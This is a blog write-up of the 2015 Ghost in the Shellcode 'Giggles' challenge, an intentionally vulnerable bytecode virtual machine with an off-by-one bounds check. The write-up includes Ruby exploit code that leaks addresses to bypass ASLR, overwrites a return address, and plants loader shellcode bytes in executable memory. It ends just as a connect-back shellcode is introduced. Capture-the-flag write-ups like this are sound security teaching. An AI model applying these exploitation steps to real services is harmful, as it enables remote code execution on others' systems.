---
id: 1970
title: 'GitS 2015: Giggles (off-by-one virtual machine)'
date: '2015-01-28T11:49:59-05:00'
author: ron
layout: post
guid: 'https://blog.skullsecurity.org/?p=1970'
permalink: /2015/gits-2015-giggles-off-by-one-virtual-machine
categories:
    - GITS2015
    - Hacking
---

Welcome to part 3 of my Ghost in the Shellcode writeup! Sorry for the delay, I actually just moved to Seattle. On a sidenote, if there are any Seattle hackers out there reading this, hit me up and let's get a drink!

Now, down to business: this writeup is about one of the Pwnage 300 levels; specifically, Giggles, which implements a very simple and very vulnerable virtual machine. You can download the binary <a href='https://blogdata.skullsecurity.org/giggles'>here</a>, the source code <a href='https://blogdata.skullsecurity.org/giggles.c'>here</a> (<a href='https://blogdata.skullsecurity.org/giggles-commented.c'>with my comments</a> - I put XXX near most of the vulnerabilities and bad practices I noticed), and my exploit <a href='https://blogdata.skullsecurity.org/giggles-sploit.rb'>here</a>.

One really cool aspect of this level was that they gave source code, a binary with symbols, and even a <a href='https://blogdata.skullsecurity.org/giggles-client.py'>client</a> (that's the last time I'll mention their client, since I dislike Python :) )! That means we could focus on exploitation and not reversing!
<!--more--><style>.smaller { font-size: 10; }</style>

<h2>The virtual machine</h2>

I'll start by explaining how the virtual machine actually works.  If you worked on this level yourself, or you don't care about the background, you can just skip over this section.

Basically, there are three operations: TYPE_ADDFUNC, TYPE_VERIFY, and TYPE_RUNFUNC.

The usual process is that the user adds a function using TYPE_ADDFUNC, which is made up of one (possibly zero?) or more operations. Then the user verifies the function, which checks for bounds violations and stuff like that. Then if that succeeds, the user can run the function. The function can take up to 10 arguments and output as much as it wants.

There are only seven different opcodes (types of operations), and one of the tricky parts is that none of them deal with absolute values&mdash;only other registers. They are:

<ul>
  <li>OP_ADD reg1, reg2 - add two registers together, and store the result in reg1</li>
  <li>OP_BR &lt;addr&gt; - branch (jump) to a particular instruction - the granularity of these jumps is actually per-instruction, not per-byte, so you can't jump into the middle of another instruction, which ruined my initial instinct :(</li>
  <li>OP_BEQ &lt;addr&gt; &lt;reg1&gt; &lt;reg2&gt; / OP_BGT &lt;addr&gt; &lt;reg1&gt; &lt;reg2&gt; - branch  if equal and branch if greater than are basically the same as OP_BR, except the jumps are conditional</li>
  <li>OP_MOV &lt;reg1&gt; &lt;reg2&lt; - set reg1 to equal reg2</li>
  <li>OP_OUT &lt;reg&gt; - output a register (gets returned as a hex value by RUNFUNC)</li>
  <li>OP_EXIT - terminate the function</li>
</ul>

To expand on the output just a bit - the program maintains the output in a buffer that's basically a series of space-separated hex values. At the end of the program (when it either terminates or OP_EXIT is called), it's sent back to the client. I was initially worried that I would have to craft some hex-with-spaces shellcode, but thankfully that wasn't necessary. :)

There are 10 different registers that can be accessed. Each one is 32 bits. The operand values, however, are all 64-bit values.

The verification process basically ensures that the registers and the addresses are mostly sane. Once it's been validated, a flag is switched and the function can be called. If you call the function before verifying it, it'll fail immediately. If you can use arbitrary bytecode instructions, you'd be able to address register 1000000, say, and read/write elsewhere in memory. They wanted to prevent that.

Speaking of the vulnerability, the bug that leads to full code execution is in the verify function - can you find it before I tell you?

The final thing to mention is arguments: when you call TYPE_RUNFUNC, you can pass up to I think 10 arguments, which are 32-bit values that are placed in the first 8 registers.

<h2>Fixing the binary</h2>

I've gotten pretty efficient at patching binaries for CTFs! I've <a href='/2014/ghost-in-the-shellcode-ti-1337-pwnable-100'>talked about this before</a>, so I'll just mention what I do briefly.

I do these things immediately, before I even start working on the challenge:

<ul>
  <li>Replace the call to alarm() with NOPs</li>
  <li>Replace the call to fork() with "xor eax, eax", followed by NOPs</li>
  <li>Replace the call to drop_privs() with NOPs</li> (if I can find it)</li>
</ul>

That way, the process won't be killed after a timeout, and I can debug it without worrying about child processes holding onto ports and other irritations. NOPing out drop_privs() means I don't have to worry about adding a user or running it as root or creating a folder for it. If you look at the objdump outputs diffed, here's what it looks like:

<pre>
<span class="Type">--- a   2015-01-27 13:30:29.000000000 -0800</span>
<span class="Type">+++ b   2015-01-27 13:30:31.000000000 -0800</span>
<span class="Identifier">@@ -1,5 +1,5 @@</span>

<span class="Special">-giggles:     file format elf64-x86-64</span>
<span class="Statement">+giggles-fixed:     file format elf64-x86-64</span>


 Disassembly of section .interp:
<span class="Identifier">@@ -1366,7 +1366,10 @@</span>
     125b:      83 7d f4 ff             cmp    DWORD PTR [rbp-0xc],0xffffffff
     125f:      75 02                   jne    1263 &lt;loop+0x3d&gt;
     1261:      eb 68                   jmp    12cb &lt;loop+0xa5&gt;
<span class="Special">-    1263:      e8 b8 fc ff ff          call   f20 &lt;fork@plt&gt;</span>
<span class="Statement">+    1263:      31 c0                   xor    eax,eax</span>
<span class="Statement">+    1265:      90                      nop</span>
<span class="Statement">+    1266:      90                      nop</span>
<span class="Statement">+    1267:      90                      nop</span>
     1268:      89 45 f8                mov    DWORD PTR [rbp-0x8],eax
     126b:      83 7d f8 ff             cmp    DWORD PTR [rbp-0x8],0xffffffff
     126f:      75 02                   jne    1273 &lt;loop+0x4d&gt;
<span class="Identifier">@@ -1374,14 +1377,26 @@</span>
     1273:      83 7d f8 00             cmp    DWORD PTR [rbp-0x8],0x0
     1277:      75 48                   jne    12c1 &lt;loop+0x9b&gt;
     1279:      bf 1e 00 00 00          mov    edi,0x1e
<span class="Special">-    127e:      e8 6d fb ff ff          call   df0 &lt;alarm@plt&gt;</span>
<span class="Statement">+    127e:      90                      nop</span>
<span class="Statement">+    127f:      90                      nop</span>
<span class="Statement">+    1280:      90                      nop</span>
<span class="Statement">+    1281:      90                      nop</span>
<span class="Statement">+    1282:      90                      nop</span>
     1283:      48 8d 05 b6 1e 20 00    lea    rax,[rip+0x201eb6]        # 203140 &lt;USER&gt;
     128a:      48 8b 00                mov    rax,QWORD PTR [rax]
     128d:      48 89 c7                mov    rdi,rax
<span class="Special">-    1290:      e8 43 00 00 00          call   12d8 &lt;drop_privs_user&gt;</span>
<span class="Statement">+    1290:      90                      nop</span>
<span class="Statement">+    1291:      90                      nop</span>
<span class="Statement">+    1292:      90                      nop</span>
<span class="Statement">+    1293:      90                      nop</span>
<span class="Statement">+    1294:      90                      nop</span>
     1295:      8b 45 ec                mov    eax,DWORD PTR [rbp-0x14]
     1298:      89 c7                   mov    edi,eax

</pre>

I just use a simple hex editor on Windows, xvi32.exe, to take care of that. But you can do it in countless other ways, obviously.

<h2>What's wrong with verifyBytecode()?</h2>

Have you found the vulnerability yet?

I'll give you a hint: look at the comparison operators in this function:

<pre>
<span class="Type">int</span> verifyBytecode(<span class="Type">struct</span> operation * bytecode, <span class="Type">unsigned</span> <span class="Type">int</span> n_ops)
{
    <span class="Type">unsigned</span> <span class="Type">int</span> i;
    <span class="Statement">for</span> (i = <span class="Constant">0</span>; i &lt; n_ops; i++)
    {
        <span class="Statement">switch</span> (bytecode[i].opcode)
        {
            <span class="Statement">case</span> OP_MOV:
            <span class="Statement">case</span> OP_ADD:
                <span class="Statement">if</span> (bytecode[i].operand1 &gt; NUM_REGISTERS)
                    <span class="Statement">return</span> <span class="Constant">0</span>;
                <span class="Statement">else</span> <span class="Statement">if</span> (bytecode[i].operand2 &gt; NUM_REGISTERS)
                    <span class="Statement">return</span> <span class="Constant">0</span>;
                <span class="Statement">break</span>;
            <span class="Statement">case</span> OP_OUT:
                <span class="Statement">if</span> (bytecode[i].operand1 &gt; NUM_REGISTERS)
                    <span class="Statement">return</span> <span class="Constant">0</span>;
                <span class="Statement">break</span>;
            <span class="Statement">case</span> OP_BR:
                <span class="Statement">if</span> (bytecode[i].operand1 &gt; n_ops)
                    <span class="Statement">return</span> <span class="Constant">0</span>;
                <span class="Statement">break</span>;
            <span class="Statement">case</span> OP_BEQ:
            <span class="Statement">case</span> OP_BGT:
                <span class="Statement">if</span> (bytecode[i].operand2 &gt; NUM_REGISTERS)
                    <span class="Statement">return</span> <span class="Constant">0</span>;
                <span class="Statement">else</span> <span class="Statement">if</span> (bytecode[i].operand3 &gt; NUM_REGISTERS)
                    <span class="Statement">return</span> <span class="Constant">0</span>;
                <span class="Statement">else</span> <span class="Statement">if</span> (bytecode[i].operand1 &gt; n_ops)
                    <span class="Statement">return</span> <span class="Constant">0</span>;
                <span class="Statement">break</span>;
            <span class="Statement">case</span> OP_EXIT:
                <span class="Statement">break</span>;
            <span class="Statement">default</span>:
                <span class="Statement">return</span> <span class="Constant">0</span>;
        }
    }
    <span class="Statement">return</span> <span class="Constant">1</span>;
}
</pre>

Notice how it checks every operation? It checks if the index is greater than the maximum value. That's an off-by-one error. Oops!

<h2>Information leak</h2>

There are actually a lot of small issues in this code. The first good one I noticed was actually that you can output one extra register. Here's what I mean (grab my <a href='https://blogdata.skullsecurity.org/giggles-sploit.rb'>exploit</a> if you want to understand the API):

<pre>
<span class="rubyDefine">def</span> <span class="Identifier">demo</span>()
  s = <span class="Type">TCPSocket</span>.new(<span class="Type">SERVER</span>, <span class="Type">PORT</span>)

  ops = []
  ops &lt;&lt; create_op(<span class="Type">OP_OUT</span>, <span class="Constant">10</span>)
  add(s, ops)
  verify(s, <span class="Constant">0</span>)
  result = execute(s, <span class="Constant">0</span>, [])

  pp result
<span class="rubyDefine">end</span>
</pre>

The output of that operation is:
"42fd35d8 "

Which, it turns out, is a memory address that's right after a "call" function. A return address!? Can it be this easy!?

It turns out that, no, it's not that easy. While I can read / write to that address, effectively bypasing ASLR, it turned out to be some left-over memory from an old call. I didn't even end up using that leak, either, I found a better one!

<h2>The actual vulnerabilitiy</h2>

After finding the off-by-one bug that let me read an extra register, I didn't really think much more about it. Later on, I came back to the verifyBytecode() function and noticed that the BR/BEQ/BGT instructions have the exact same bug! You can branch to the last instruction + 1, where it keeps running unverified memory as if it's bytecode!

What comes after the last instruction in memory? Well, it turns out to be a whole bunch of zeroes (00 00 00 00...), then other functions you've added, verified or otherwise. An instruction is 26 bytes long in memory (two bytes for the opcode, and three 64-bit operands), and the instruction "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" actually maps to "add reg0, reg0", which is nice and safe to do over and over again (although it does screw up the value in reg0).

<h2>Aligning the interpreter</h2>

At this point, it got a bit complicated. Sure, I'd found a way to break out of the sandbox to run unverified code, but it's not as straight forward as you might think.

The problem? The spacing of the different "functions" in memory (that is, groups of operations) aren't multiples of 26 bytes apart, thanks to headers, so if you break out of one function and into another, you wind up trying to execute bytecode that's somewhat offset.

In other words, if your second function starts at address 0, the interpreter tries to run the bytecode at -12 (give or take). The bytecode at -12 just happens to be the number of instructions in the function, so the first opcode is actually equal to the number of operations (so if you have three operations in the function, the first operation will be opcode 3, or BEQ). Its operands are bits and pieces of the opcodes and operands. Basically, it's a big mess.

To get this working, I wanted to basically just skip over that function altogether and run the third function (which would hopefully be a little better aligned). Basically, I wanted the function to do nothing dangerous, then continue on to the third function.

Here's the code I ended up writing (sorry the formatting isn't great, check out the exploit I linked above to see it better):

<pre class='smaller'>
<span class="Comment"># This creates a valid-looking bytecode function that jumps out of bounds,</span>
<span class="Comment"># then a non-validated function that puts us in a more usable bytecode</span>
<span class="Comment"># escape</span>
<span class="rubyDefine">def</span> <span class="Identifier">init</span>()
  puts(<span class="Special">&quot;</span><span class="Constant">[*] Connecting to </span><span class="Special">#{</span><span class="Type">SERVER</span><span class="Special">}</span><span class="Constant">:</span><span class="Special">#{</span><span class="Type">PORT</span><span class="Special">}</span><span class="Special">&quot;</span>)
  s = <span class="Type">TCPSocket</span>.new(<span class="Type">SERVER</span>, <span class="Type">PORT</span>)
  <span class="Comment">#puts(&quot;[*] Connected!&quot;)</span>

  ops = []

  <span class="Comment"># This branches to the second instruction - which doesn't exist</span>
  ops &lt;&lt; create_op(<span class="Type">OP_BR</span>, <span class="Constant">1</span>)
  add(s, ops)
  verify(s, <span class="Constant">0</span>)

  <span class="Comment"># This little section takes some explaining. Basically, we've escaped the bytecode</span>
  <span class="Comment"># interpreter, but we aren't aligned properly. As a result, it's really irritating</span>
  <span class="Comment"># to write bytecode (for example, the code of the first operation is equal to the</span>
  <span class="Comment"># number of operations!)</span>
  <span class="Comment">#</span>
  <span class="Comment"># Because there are 4 opcodes below, it performs opcode 4, which is 'mov'. I ensure</span>
  <span class="Comment"># that both operands are 0, so it does 'mov reg0, reg0'.</span>
  <span class="Comment">#</span>
  <span class="Comment"># After that, the next one is a branch (opcode 1) to offset 3, which effectively</span>
  <span class="Comment"># jumps past the end and continues on to the third set of bytecode, which is out</span>
  <span class="Comment"># ultimate payload.</span>

  ops = []
  <span class="Comment"># (operand = count)</span>
  <span class="Comment">#                  |--|               |---|                                          &lt;-- inst1 operand1 (0 = reg0)</span>
  <span class="Comment">#                          |--------|                    |----|                      &lt;-- inst1 operand2 (0 = reg0)</span>
  <span class="Comment">#                                                                        |--|        &lt;-- inst2 opcode (1 = br)</span>
  <span class="Comment">#                                                                  |----|            &lt;-- inst2 operand1</span>
  ops &lt;&lt; create_op(<span class="Constant">0x0000</span>, <span class="Constant">0x0000000000000000</span>, <span class="Constant">0x4242424242000000</span>, <span class="Constant">0x00003d0001434343</span>)
  <span class="Comment">#                  |--|              |----|                                          &lt;-- inst2 operand1</span>
  ops &lt;&lt; create_op(<span class="Constant">0x0000</span>, <span class="Constant">0x4444444444000000</span>, <span class="Constant">0x4545454545454545</span>, <span class="Constant">0x4646464646464646</span>)
  <span class="Comment"># The values of these don't matter, as long as we still have 4 instructions</span>
  ops &lt;&lt; create_op(<span class="Constant">0xBBBB</span>, <span class="Constant">0x4747474747474747</span>, <span class="Constant">0x4848484848484848</span>, <span class="Constant">0x4949494949494949</span>)
  ops &lt;&lt; create_op(<span class="Constant">0xCCCC</span>, <span class="Constant">0x4a4a4a4a4a4a4a4a</span>, <span class="Constant">0x4b4b4b4b4b4b4b4b</span>, <span class="Constant">0x4c4c4c4c4c4c4c4c</span>)

  <span class="Comment"># Add them</span>
  add(s, ops)

  <span class="Statement">return</span> s
<span class="rubyDefine">end</span>
</pre>

The comments explain it pretty well, but I'll explain it again. :)

The first opcode in the unverified function is, as I mentioned, equal to the number of operations. We create a function with 4 operations, which makes it a MOV instruction. Performing a MOV is pretty safe, especially since reg0 is already screwed up.

The two operands to instruction 1 are parts of the opcodes and operands of the first function. And the opcode for the second instruction is part of third operand in the first operation we create. Super confusing!

Effectively, this ends up running:

<pre>
<span class="Identifier">mov</span> <span class="Identifier">reg0</span>, <span class="Identifier">reg0</span>
<span class="Identifier">br</span> <span class="Constant">0x3d</span>
<span class="Comment">; [bad instructions that get skipped]</span>
</pre>

I'm honestly not sure why I chose 0x3d as the jump distance, I suspect it's just a number that I was testing with that happened to work. The instructions after the BR don't matter, so I just fill them in with garbage that's easy to recognize in a debugger.

So basically, this function just does nothing, effectively, which is exactly what I wanted.

<h2>Getting back in sync</h2>

I hoped that the third function would run perfectly, but because of math, it still doesn't. However, the operation count no longer matters in the third function, which is good enough for me! After doing some experiments, I determined that the instructions are unaligned by 0x10 (16) bytes. If you pad the start with 0x10 bytes then add instructions as normal, they'll run completely unverified.

To build the opcodes for the third function, I added a parameter to the add() function that lets you offset things:

<pre>
<span class="Comment">#[...]</span>
  <span class="Comment"># We have to cleanly exit</span>
  ops &lt;&lt; create_op(<span class="Type">OP_EXIT</span>)

  <span class="Comment"># Add the list of ops, offset by 10 (that's how the math worked out)</span>
  add(s, ops, <span class="Constant">16</span>)
<span class="Comment">#[...]</span>
</pre>

Now you can run entirely unverified bytecode instructions! That means full read/write/execute of arbitrary addresses relative to the base address of the <tt>registers</tt> array. That's awesome! Because the <tt>registers</tt> array is on the stack, we have read/write access relative to a stack address. That means you can trivially read/write the return address and leak addresses of the binary, libc, or anything you want. ASLR bypass and RIP control instantly!

<h2>Leaking addresses</h2>

There are two separate sets of addresses that need to be leaked. It turns out that even though ASLR is enabled, the addresses don't actually randomize between different connections, so I can leak addresses, reconnect, leak more addresses, reconnect, and run the exploit. It's not the cleanest way to solve the level, but it worked! If this didn't work, I could have written a simple multiplexer bytecode function that does all these things using the same function.

I mentioned I can trivially leak the binary address and a stack address. Here's how:

<pre>
<span class="Comment"># This function leaks two addresses: a stack address and the address of</span>
<span class="Comment"># the binary image (basically, defeating ASLR)</span>
<span class="rubyDefine">def</span> <span class="Identifier">leak_addresses</span>()
  puts(<span class="Special">&quot;</span><span class="Constant">[*] Bypassing ASLR by leaking stack/binary addresses</span><span class="Special">&quot;</span>)
  s = init()

  <span class="Comment"># There's a stack address at offsets 24/25</span>
  ops = []
  ops &lt;&lt; create_op(<span class="Type">OP_OUT</span>, <span class="Constant">24</span>)
  ops &lt;&lt; create_op(<span class="Type">OP_OUT</span>, <span class="Constant">25</span>)

  <span class="Comment"># 26/27 is the return address, we'll use it later as well!</span>
  ops &lt;&lt; create_op(<span class="Type">OP_OUT</span>, <span class="Constant">26</span>)
  ops &lt;&lt; create_op(<span class="Type">OP_OUT</span>, <span class="Constant">27</span>)

  <span class="Comment"># We have to cleanly exit</span>
  ops &lt;&lt; create_op(<span class="Type">OP_EXIT</span>)

  <span class="Comment"># Add the list of ops, offset by 10 (that's how the math worked out)</span>
  add(s, ops, <span class="Constant">16</span>)

  <span class="Comment"># Run the code</span>
  result = execute(s, <span class="Constant">0</span>, [])

  <span class="Comment"># The result is a space-delimited array of hex values, convert it to</span>
  <span class="Comment"># an array of integers</span>
  a = result.split(<span class="Special">/</span><span class="Constant"> </span><span class="Special">/</span>).map { |<span class="Identifier">str</span>| str.to_i(<span class="Constant">16</span>) }

  <span class="Comment"># Read the two values in and do the math to calculate them</span>
  <span class="Identifier">@@registers</span> = ((a[<span class="Constant">1</span>] &lt;&lt; <span class="Constant">32</span>) | (a[<span class="Constant">0</span>])) - <span class="Constant">0xc0</span>
  <span class="Identifier">@@base_addr</span> = ((a[<span class="Constant">3</span>] &lt;&lt; <span class="Constant">32</span>) | (a[<span class="Constant">2</span>])) - <span class="Constant">0x1efd</span>

  <span class="Comment"># User output</span>
  puts(<span class="Special">&quot;</span><span class="Constant">[*] Found the base address of the register array: 0x</span><span class="Special">#{</span><span class="Identifier">@@registers</span>.to_s(<span class="Constant">16</span>)<span class="Special">}</span><span class="Special">&quot;</span>)
  puts(<span class="Special">&quot;</span><span class="Constant">[*] Found the base address of the binary: 0x</span><span class="Special">#{</span><span class="Identifier">@@base_addr</span>.to_s(<span class="Constant">16</span>)<span class="Special">}</span><span class="Special">&quot;</span>)

  s.close
<span class="rubyDefine">end</span>
</pre>

Basically, we output registers 24, 25, 26, and 27. Since the OUT function is 4 bytes, you have to call OUT twice to leak a 64-bit address.

Registers 24 and 25 are an address on the stack. The address is 0xc0 bytes above the address of the <tt>registers</tt> variable (which is the base address of our overflow, and therefore needed for calculating offsets), so we subtract that. I determined the 0xc0 value using a debugger.

Registers 26 and 27 are the return address of the current function, which happens to be 0x1efd bytes into the binary (determined with IDA). So we subtract that value from the result and get the base address of the binary.

I also found a way to leak a libc address here, but since I never got a copy of libc I didn't bother keeping that code around.

Now that we have the base address of the binary and the address of the <tt>registers</tt>, we can use the OUT and MOV operations, plus a little bit of math, to read and write anywhere in memory.

<h2>Quick aside: getting enough sleep</h2>

You may not know this, but I work through CTF challenges very slowly. I like to understand every aspect of everything, so I don't rush. My secret is, I can work tirelessly at these challenges until they're complete. But I'll never win a race.

I got to this point at around midnight, after working nearly 10 hours on this challenge. Most CTFers will wonder why it took 10 hours to get here, so I'll explain again: I work slowly. :)

The problem is, I forgot one very important fact: that the operands to each operation are all 64-bit values, even though the arguments and registers themselves are 32-bit. That means we can calculate an address from the <tt>register</tt> array to anywhere in memory. I thought they were 32 bit, however, and since the process is 64-bit Ii'd be able to read/write the stack, but <em>not</em> addresses the binary! That wasn't true, I could write anywhere, but I didn't know that. So I was trying a bunch of crazy stack stuff to get it working, but ultimately failed.

At around 2am I gave up and played video games for an hour, then finished <a href='https://en.wikipedia.org/wiki/Making_Money'>the book I was reading</a>. I went to bed about 3:30am, still thinking about the problem. Laying in bed about 4am, it clicked in that register numbers could be 64-bit, so I got up and finished it up for about 7am. :)

The moral of this story is: sometimes it pays to get some rest when you're struggling with a problem!

<h2>+rwx memory!?</h2>

The authors of the challenge must have been feeling extremely generous: they gave us a segment of memory that's readable, writeable, and executable! You can write code to it then run it! Here's where it's declared:

<pre>
<span class="Type">void</span> * JIT;     <span class="Comment">// </span><span class="Todo">TODO</span><span class="Comment">: add code to JIT functions</span>

<span class="Comment">//[...]</span>

    <span class="Comment">/*</span><span class="Comment"> Map 4096 bytes of executable memory </span><span class="Comment">*/</span>
    JIT = mmap(<span class="Constant">0</span>, <span class="Constant">4096</span>, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, <span class="Constant">0</span>);
</pre>

A pointer to the memory is stored in a global variable. Since we have the ability to read an arbitrary address&mdash;once I realized my 64-bit problem&mdash;it was pretty easy to read the pointer:

<pre>
<span class="rubyDefine">def</span> <span class="Identifier">leak_rwx_address</span>()
  puts(<span class="Special">&quot;</span><span class="Constant">[*] Attempting to leak the address of the mmap()'d +rwx memory...</span><span class="Special">&quot;</span>)
  s = init()

  <span class="Comment"># This offset is always constant, from the binary</span>
  jit_ptr = <span class="Identifier">@@base_addr</span> + <span class="Constant">0x20f5c0</span>

  <span class="Comment"># Read both halves of the address - the read is relative to the stack-</span>
  <span class="Comment"># based register array, and has a granularity of 4, hence the math</span>
  <span class="Comment"># I'm doing here</span>
  ops = []
  ops &lt;&lt; create_op(<span class="Type">OP_OUT</span>, (jit_ptr - <span class="Identifier">@@registers</span>) / <span class="Constant">4</span>)
  ops &lt;&lt; create_op(<span class="Type">OP_OUT</span>, ((jit_ptr + <span class="Constant">4</span>) - <span class="Identifier">@@registers</span>) / <span class="Constant">4</span>)
  ops &lt;&lt; create_op(<span class="Type">OP_EXIT</span>)
  add(s, ops, <span class="Constant">16</span>)
  result = execute(s, <span class="Constant">0</span>, [])

  <span class="Comment"># Convert the result from a space-delimited hex list to an integer array</span>
  a = result.split(<span class="Special">/</span><span class="Constant"> </span><span class="Special">/</span>).map { |<span class="Identifier">str</span>| str.to_i(<span class="Constant">16</span>) }

  <span class="Comment"># Read the address</span>
  <span class="Identifier">@@rwx_addr</span> = ((a[<span class="Constant">1</span>] &lt;&lt; <span class="Constant">32</span>) | (a[<span class="Constant">0</span>]))

  <span class="Comment"># User output</span>
  puts(<span class="Special">&quot;</span><span class="Constant">[*] Found the +rwx memory: 0x</span><span class="Special">#{</span><span class="Identifier">@@rwx_addr</span>.to_s(<span class="Constant">16</span>)<span class="Special">}</span><span class="Special">&quot;</span>)

  s.close
<span class="rubyDefine">end</span>

</pre>

Basically, we know the pointer to the JIT code is at the base_addr + 0x20f5c0 (determined with IDA). So we do some math with that address and the base address of the <tt>registers</tt> array (dividing by 4 because that's the width of each register).

<h2>Finishing up</h2>

Now that we can run arbitrary bytecode instructions, we can read, write, and execute any address. But there was one more problem: getting the code into the JIT memory.

It seems pretty straight forward, since we can write to arbitrary memory, but there's a problem: you don't have any absolute values in the assembly language, which means I can't directly write a bunch of values to memory. What I <em>could</em> do, however, is write values from registers to memory, and I can set the registers by passing in arguments.

BUT, reg0 gets messed up and two registers are wasted because I have to use them to overwrite the return address. That means I have 7 32-bit registers that I can use.

What you're probably thinking is that I can implement a multiplexer in their assembly language. I could have some operands like "write this dword to this memory address" and build up the shellcode by calling the function multiple times with multiple arguments.

If you're thinking that, then you're sharper than I was at 7am with no sleep! I decided that the best way was to write a shellcode loader in 24 bytes. I actually love writing short, custom-purpose shellcode, there's something satisfying about it. :)

Here's my loader shellcode:

<pre>
  <span class="Comment"># Create some loader shellcode. I'm not proud of this - it was 7am, and I hadn't</span>
  <span class="Comment"># slept yet. I immediately realized after getting some sleep that there was a</span>
  <span class="Comment"># way easier way to do this...</span>
  params =
    <span class="Comment"># param0 gets overwritten, just store crap there</span>
    <span class="Special">&quot;</span><span class="Special">\x41\x41\x41\x41</span><span class="Special">&quot;</span> +

    <span class="Comment"># param1 + param2 are the return address</span>
    [<span class="Identifier">@@rwx_addr</span> &amp; <span class="Constant">0x00000000FFFFFFFF</span>, <span class="Identifier">@@rwx_addr</span> &gt;&gt; <span class="Constant">32</span>].pack(<span class="Special">&quot;</span><span class="Constant">II</span><span class="Special">&quot;</span>) +

    <span class="Comment"># ** Now, we build up to 24 bytes of shellcode that'll load the actual shellcode</span>

    <span class="Comment"># Decrease ECX to a reasonable number (somewhere between 200 and 10000, doesn't matter)</span>
    <span class="Special">&quot;</span><span class="Special">\xC1\xE9\x10</span><span class="Special">&quot;</span> +  <span class="Comment"># shr ecx, 10</span>

    <span class="Comment"># This is where the shellcode is read from - to save a couple bytes (an absolute move is 10</span>
    <span class="Comment"># bytes long!), I use r12, which is in the same image and can be reached with a 4-byte add</span>
    <span class="Special">&quot;</span><span class="Special">\x49\x8D\xB4\x24\x88\x2B\x20\x00</span><span class="Special">&quot;</span> + <span class="Comment"># lea rsi,[r12+0x202b88]</span>

    <span class="Comment"># There is where the shellcode is copied to - immediately after this shellcode</span>
    <span class="Special">&quot;</span><span class="Special">\x48\xBF</span><span class="Special">&quot;</span> + [<span class="Identifier">@@rwx_addr</span> + <span class="Constant">24</span>].pack(<span class="Special">&quot;</span><span class="Constant">Q</span><span class="Special">&quot;</span>) + <span class="Comment"># mov rdi, @@rwx_addr + 24</span>

    <span class="Comment"># And finally, this moves the bytes over</span>
    <span class="Special">&quot;</span><span class="Special">\xf3\xa4</span><span class="Special">&quot;</span> <span class="Comment"># rep movsb</span>

  <span class="Comment"># Pad the shellcode with NOP bytes so it can be used as an array of ints</span>
  <span class="Statement">while</span>((params.length % <span class="Constant">4</span>) != <span class="Constant">0</span>)
    params += <span class="Special">&quot;</span><span class="Special">\x90</span><span class="Special">&quot;</span>
  <span class="Statement">end</span>

  <span class="Comment"># Convert the shellcode to an array of ints</span>
  params = params.unpack(<span class="Special">&quot;</span><span class="Constant">I*</span><span class="Special">&quot;</span>)
</pre>

Basically, the first three arguments are wasted (the first gets messed up and the next two are the return address). Then we set up a call to "rep movsb", with rsi, rdi, and rcx set appropriately (and complicatedly). You can see how I did that in the comments. All told, it's 23 bytes of machine code.

It took me a lot of time to get that working, though! Squeezing out every single byte! It basically copies the code from the next bytecode function (whose address I can calculate based on r12) to the address immediately after itself in the +RWX memory (which I can leak beforehand).

This code is written to the +RWX memory using these operations:

<pre>
  ops = []

  <span class="Comment"># Overwrite teh reteurn address with the first two operations</span>
  ops &lt;&lt; create_op(<span class="Type">OP_MOV</span>, <span class="Constant">26</span>, <span class="Constant">1</span>)
  ops &lt;&lt; create_op(<span class="Type">OP_MOV</span>, <span class="Constant">27</span>, <span class="Constant">2</span>)

  <span class="Comment"># This next bunch copies shellcode from the arguments into the +rwx memory</span>
  ops &lt;&lt; create_op(<span class="Type">OP_MOV</span>, ((<span class="Identifier">@@rwx_addr</span> + <span class="Constant">0</span>) - <span class="Identifier">@@registers</span>) / <span class="Constant">4</span>, <span class="Constant">3</span>)
  ops &lt;&lt; create_op(<span class="Type">OP_MOV</span>, ((<span class="Identifier">@@rwx_addr</span> + <span class="Constant">4</span>) - <span class="Identifier">@@registers</span>) / <span class="Constant">4</span>, <span class="Constant">4</span>)
  ops &lt;&lt; create_op(<span class="Type">OP_MOV</span>, ((<span class="Identifier">@@rwx_addr</span> + <span class="Constant">8</span>) - <span class="Identifier">@@registers</span>) / <span class="Constant">4</span>, <span class="Constant">5</span>)
  ops &lt;&lt; create_op(<span class="Type">OP_MOV</span>, ((<span class="Identifier">@@rwx_addr</span> + <span class="Constant">12</span>) - <span class="Identifier">@@registers</span>) / <span class="Constant">4</span>, <span class="Constant">6</span>)
  ops &lt;&lt; create_op(<span class="Type">OP_MOV</span>, ((<span class="Identifier">@@rwx_addr</span> + <span class="Constant">16</span>) - <span class="Identifier">@@registers</span>) / <span class="Constant">4</span>, <span class="Constant">7</span>)
  ops &lt;&lt; create_op(<span class="Type">OP_MOV</span>, ((<span class="Identifier">@@rwx_addr</span> + <span class="Constant">20</span>) - <span class="Identifier">@@registers</span>) / <span class="Constant">4</span>, <span class="Constant">8</span>)
  ops &lt;&lt; create_op(<span class="Type">OP_MOV</span>, ((<span class="Identifier">@@rwx_addr</span> + <span class="Constant">24</span>) - <span class="Identifier">@@registers</span>) / <span class="Constant">4</span>, <span class="Constant">9</span>)
</pre>

Then I just convert the shellcode into a bunch of bytecode operators / operands, which will be the entirity of the fourth bytecode function (I'm proud to say that this code worked on the first try):

<pre>
  <span class="Comment"># Pad the shellcode to the proper length</span>
  shellcode = <span class="Type">SHELLCODE</span>
  <span class="Statement">while</span>((shellcode.length % <span class="Constant">26</span>) != <span class="Constant">0</span>)
    shellcode += <span class="Special">&quot;</span><span class="Special">\xCC</span><span class="Special">&quot;</span>
  <span class="Statement">end</span>

  <span class="Comment"># Now we create a new function, which simply stores the actual shellcode.</span>
  <span class="Comment"># Because this is a known offset, we can copy it to the +rwx memory with</span>
  <span class="Comment"># a loader</span>
  ops = []

  <span class="Comment"># Break the shellcode into 26-byte chunks (the size of an operation)</span>
  shellcode.chars.each_slice(<span class="Constant">26</span>) <span class="Statement">do</span> |<span class="Identifier">slice</span>|
    <span class="Comment"># Make the character array into a string</span>
    slice = slice.join

    <span class="Comment"># Split it into the right proportions</span>
    a, b, c, d = slice.unpack(<span class="Special">&quot;</span><span class="Constant">SQQQ</span><span class="Special">&quot;</span>)

    <span class="Comment"># Add them as a new operation</span>
    ops &lt;&lt; create_op(a, b, c, d)
  <span class="Statement">end</span>

  <span class="Comment"># Add the operations to a new function (no offset, since we just need to</span>
  <span class="Comment"># get it stored, not run as bytecode)</span>
  add(s, ops, <span class="Constant">16</span>)
</pre>

And, for good measure, here's my 64-bit connect-back shellcode:

<pre>
